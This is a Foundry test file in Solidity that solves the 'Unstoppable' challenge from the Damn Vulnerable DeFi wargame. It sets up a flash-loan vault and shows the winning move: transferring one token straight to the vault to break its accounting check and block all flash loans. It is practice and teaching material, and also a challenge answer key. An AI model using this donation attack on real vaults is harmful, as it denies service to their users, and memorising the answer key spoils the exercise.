// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@test/BaseTest.sol";
import "@solmate/src/tokens/ERC20.sol";
import "@src/damn-vulnerable-defi/unstoppable/ReceiverUnstoppable.sol";
import "@src/damn-vulnerable-defi/unstoppable/UnstoppableVault.sol";
import "@src/damn-vulnerable-defi/DamnValuableToken.sol";

contract UnstoppableTest is BaseTest {
  address someUser = makeAddr("someUser");
  DamnValuableToken token;
  UnstoppableVault vault;
  ReceiverUnstoppable receiverContract;
  uint256 constant TOKENS_IN_VAULT = 1_000_000 ether;
  uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10 ether;


  function setUp() public override {
    super.setUp();
    vm.startPrank(deployer);
    token = new DamnValuableToken();
    vm.label(address(token), "DamnValuableToken");
    vault = new UnstoppableVault(ERC20(token), deployer, deployer);
    vm.label(address(vault), "UnstoppableVault");
    assertEq(address(vault.asset()), address(token));

    token.approve(address(vault), TOKENS_IN_VAULT);
    vault.deposit(TOKENS_IN_VAULT, deployer);

    assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
    assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
    assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
    assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
    assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
    assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50_000 ether);

    token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
    assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

    // Show it's possible for someUser to take out a flash loan
    vm.startPrank(someUser);
    receiverContract = new ReceiverUnstoppable(address(vault));
    vm.label(address(receiverContract), "ReceiverUnstoppable");
    receiverContract.executeFlashLoan(100 ether);
  }

  function testDoSFlashLoans() public {
    /** CODE YOUR SOLUTION HERE */
    vm.startPrank(player);
    token.transfer(address(vault), 1);
    // @note Transferring tokens via normal transfer to the vault makes the 2 tokens accounting to mismatch, 
    // causing a revert and DoSing the function

    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // It is no longer possible to execute flash loans
    vm.stopPrank();
    vm.startPrank(someUser);
    vm.expectRevert();
    receiverContract.executeFlashLoan(100 ether);
  }
}